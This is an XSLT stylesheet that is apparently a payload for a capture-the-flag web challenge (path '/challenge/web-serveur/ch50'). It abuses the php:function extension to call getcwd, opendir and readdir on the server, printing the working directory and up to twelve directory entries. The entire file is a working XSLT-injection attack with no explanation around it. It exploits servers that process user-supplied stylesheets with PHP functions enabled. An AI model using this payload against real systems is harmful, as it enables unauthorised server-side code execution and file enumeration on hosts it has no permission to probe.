<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:output method="html"/>

  <xsl:template match="/">
    <html>
      <body>
        <pre>
PWD:
<xsl:value-of select="php:function('getcwd')" />

DIR:
<xsl:variable name="d" select="php:function('opendir', '/challenge/web-serveur/ch50')" />
1: <xsl:value-of select="php:function('readdir', $d)" />
2: <xsl:value-of select="php:function('readdir', $d)" />
3: <xsl:value-of select="php:function('readdir', $d)" />
4: <xsl:value-of select="php:function('readdir', $d)" />
5: <xsl:value-of select="php:function('readdir', $d)" />
6: <xsl:value-of select="php:function('readdir', $d)" />
7: <xsl:value-of select="php:function('readdir', $d)" />
8: <xsl:value-of select="php:function('readdir', $d)" />
9: <xsl:value-of select="php:function('readdir', $d)" />
10: <xsl:value-of select="php:function('readdir', $d)" />
11: <xsl:value-of select="php:function('readdir', $d)" />
12: <xsl:value-of select="php:function('readdir', $d)" />
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
